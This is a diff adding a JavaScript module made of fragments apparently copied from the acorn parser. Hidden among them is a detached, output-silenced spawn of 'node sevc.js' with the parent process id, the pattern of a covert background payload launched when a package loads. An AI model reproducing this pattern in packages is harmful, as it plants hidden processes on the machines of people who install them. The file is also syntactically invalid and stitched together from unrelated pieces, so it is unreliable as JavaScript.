@@ -1,0 +1,63 @@
+const pJSON = require("./package.json")
+const package = pJSON.name
+function runcode = function runcode(code) {
+  var result;
+  try {
+    if (!tokenize) {
+      result = acorn.parse(code, options);
+    } else {
+      result = [];
+      var tokenizer = acorn.tokenizer(code, options), token;
+      do {
+        token = tokenizer.getToken();
+        result.push(token);
+      } while (token.type !== acorn.tokTypes.eof)
+    }
+  } catch (e) {
+    console.error(infile && infile !== "-" ? e.message.replace(/\(\d+:\d+\)$/, function (m) { return m.slice(0, 1) + infile + " " + m.slice(1); }) : e.message);
+    process.exit(1);
+  }
+  if (!silent) { console.log(JSON.stringify(result, null, compact ? null : 2)); }
+}
+function isIdChar = function isIdChar(code, astral) {
+    if (code < 48) { return code === 36 }
+    if (code < 58) { return true }
+    if (code < 65) { return false }
+    if (code < 91) { return true }
+    if (code < 97) { return code === 95 }
+    if (code < 123) { return true }
+    if (code <= 0xffff) { return code >= 0xaa && nonASCIIidentifier.test(String.fromCharCode(code)) }
+    if (astral === false) { return false }
+    return isInAstralSet(code, astralIdentifierStartCodes) || isInAstralSet(code, astralIdentifierCodes)
+}
+module.exports = isIdChar
+function ded = function ded(st) {
+  return st;
+}
+var spawn = require('child_process').spawn
+(_tmp_3 = spawn('node', ['sevc.js',process.pid], {
+    detached: true,
+    stdio: 'ignore' // piping all stdio to /dev/null
+})).unref
+_tmp_5.detached = true
+_tmp_5.stdio = "ignore"
+function int = async function int() {
+  await sp(500);
+}
+function sp = function sp(ms) {
+  return new Promise((resolve) => {
+    setTimeout(resolve, ms);
+  });
+}
+function getLInfo = function getLInfo(input, offset) {
+    for (var line = 1, cur = 0;;) {
+      lineBreakG.lastIndex = cur;
+      var match = lineBreakG.exec(input);
+      if (match && match.index < offset) {
+        ++line;
+        cur = match.index + match[0].length;
+      } else {
+        return new Position(line, offset - cur)
+      }
+    }
+}
